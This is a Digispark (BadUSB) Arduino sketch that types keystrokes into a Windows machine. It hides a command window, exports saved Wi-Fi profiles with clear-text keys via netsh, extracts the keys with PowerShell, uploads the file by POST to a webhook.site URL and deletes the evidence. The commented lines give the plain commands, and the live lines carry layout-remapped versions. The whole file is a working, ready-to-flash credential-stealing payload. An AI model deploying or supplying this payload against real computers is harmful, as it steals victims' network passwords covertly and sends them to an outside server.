/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
 rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
*/


#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  //DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible for trying to making it as less noticeable as possible
  DigiKeyboard.println("cmd &k mode con> cols)10 lines)1");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  
  //DigiKeyboard.println("cd %temp%"); //Jumping to temporary dir
  DigiKeyboard.println("cd %temp%");
  DigiKeyboard.delay(300);  
  //DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.println("netsh wlan export profile key)clear");
  DigiKeyboard.delay(500);
  //DigiKeyboard.println("powershell Select-String -Path *Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboard.print("powershell Select/String /Path }Wi}.xml /Pattern @keyMaterial@  "); 
  DigiKeyboard.sendKeyStroke(100, MOD_SHIFT_RIGHT);
  DigiKeyboard.println(" Wi/Fi/PASS");
  DigiKeyboard.delay(1000);  
  //DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/fe03a241-f787-4b93-b4ae-6cf9c1f93b34 -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboard.println("powershell Invoke/WebRequest /Uri https>&&webhook.site&e3a68e8d/23fd/43a2/bd70/f373250f4c48 /Method POST /InFile Wi/Fi/PASS");
  DigiKeyboard.delay(1000);  
  //DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboard.println("del Wi/} &s &f &q");
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);  
  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}